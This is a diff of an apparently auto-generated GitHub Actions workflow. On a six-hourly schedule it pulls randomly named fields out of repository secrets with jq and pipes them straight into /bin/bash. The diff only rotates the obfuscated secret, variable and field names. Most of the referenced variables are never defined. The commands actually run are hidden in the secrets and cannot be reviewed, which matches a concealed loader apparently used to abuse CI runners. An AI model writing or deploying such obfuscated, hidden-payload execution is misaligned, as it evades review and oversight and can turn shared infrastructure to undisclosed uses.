@@ -1,26 +1,21 @@
 name: yutongshen7483
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '24 2/6 * * *'
-
+    - cron: '43 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: yutongshen7483
         env:
-          dkc614: ${{ secrets.dkc614 }}
+          olos96: ${{ secrets.olos96 }}
         run: |
-          echo $dkc614 | jq -r .eflpb0 | /bin/bash
-          echo $em8671 | jq -r .ivobg19870 | /bin/bash
-          echo $bidnu859 | jq -r .c77 | /bin/bash
-          echo $qvbfs71 | jq -r .y107 | /bin/bash
-          echo $jhr3994 | jq -r .uybh939 | /bin/bash
-          echo $yv14 | jq -r .p5784 | /bin/bash
-          echo $z53 | jq -r .mpfy4357 | /bin/bash
-          echo $ptqac32661 | jq -r .ry9795 | /bin/bash
-          echo $z334 | jq -r .dlovc564 | /bin/bash
+          echo $olos96 | jq -r .puacj11473 | /bin/bash
+          echo $ju87352 | jq -r .zc69238 | /bin/bash
+          echo $ogchy41533 | jq -r .wyg52 | /bin/bash
+          echo $t38 | jq -r .lsu898 | /bin/bash
+          echo $sktde22598 | jq -r .tercz985 | /bin/bash
 
